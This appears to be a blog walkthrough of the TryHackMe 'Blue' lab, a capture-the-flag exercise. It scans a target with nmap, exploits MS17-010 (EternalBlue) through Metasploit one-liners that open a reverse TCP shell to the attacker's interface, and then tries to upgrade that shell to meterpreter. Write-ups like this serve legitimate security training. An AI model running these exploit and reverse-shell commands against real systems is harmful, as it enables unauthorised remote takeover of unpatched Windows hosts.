---
title: 'TryHackMe - Blue'
excerpt: 'Scanning a host for vulnerabilities with nmap. Running an exploit against the target using Metasploit to gain a reverse TCP shell and upgrading the shell. Meterpreter usage and session navigation.'
coverImage: '/assets/blog/thm-blue/thm-blue-cover.png'
date: '2023-06-29T05:51:07.322Z'
author:
  name: Zaphod Beeblebrox
  picture: '/assets/blog/authors/skull.jpeg'
ogImage:
  url: '/assets/blog/thm-blue/thm-blue-cover.png'
---

# THM Eternal Blue  

## Recon  

 ### // Set a terminal environmental variable for target IP address  

    export IP=<target-ip-address> 

 ### // Run nmap vulnerability scan 

    nmap -sV -vv --script=vuln $IP  

 ### // Example  

![](../public/assets/blog/thm-blue/thm-blue-nmap-command.png)  

 ### // Results  

![](../public/assets/blog/thm-blue/thm-blue-nmap-results.png)

> Host is vulnerable to Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)  

https://www.exploit-db.com/exploits/41891  

## Exploit  

 ### // Run msfconsole and perform reverse tcp shell exploit   

     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  

> We set the RHOSTS, LHOST, and payload option for the script (RHOSTS and LHOST are set globally)  

 ### // Metasploit go brrrr...  

 ![](../public/assets/blog/thm-blue/thm-blue-msfc-reverse-tcp-shell-command.png)  

 > Options have been set and exploit is running  

  // Results  

  ![](../public/assets/blog/thm-blue/thm-blue-eternal-blue-exploit-success.png)  

  > Exploit initially failed, now we have a basic shell  

 ### // Backgrounding the shell example    

     background  

> Ctrl-z does the same thing  

 ![](../public/assets/blog/thm-blue/thm-blue-background-example.png)

 ## Post-Exploit > Upgrade the reverse TCP shell to a meterpreter shell  

 ### // Search for the command   
     search upgrade shell   

 ![](../public/assets/blog/thm-blue/thm-blue-search-upgrade-shell-1.png)  

 ### // Select the script for use  

     use shell_to_meterpreter  

> Alternative: "use 4" (4th result in searches)

 ![](../public/assets/blog/thm-blue/thm-blue-run-upgrade-shell.png)  

 ### // Set options for shell_to_meterpreter - The script needs the session ID of our reverse TCP shell  

 ![](../public/assets/blog/thm-blue/thm-upgrade-shell-options.png)  

 > Example of setting options and using "sessions" to display sessions  

 ### // Run the script  



 > The script ran, but we don't have an upgraded shell...

 ### // Hmmm. Thats not working...  
 For some reason, the script isn't upgrading our shell. No worries, a meterpreter shell is the default when a payload isn't set for the eternal blue exploit.

 ### // Let's try again  

     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOSTS $IP;set LHOST tun0;run"  

 > This time we omit the "set payload windows/x64/shell/reverse_tcp" option. A meterpreter shell will be spun up by default.  






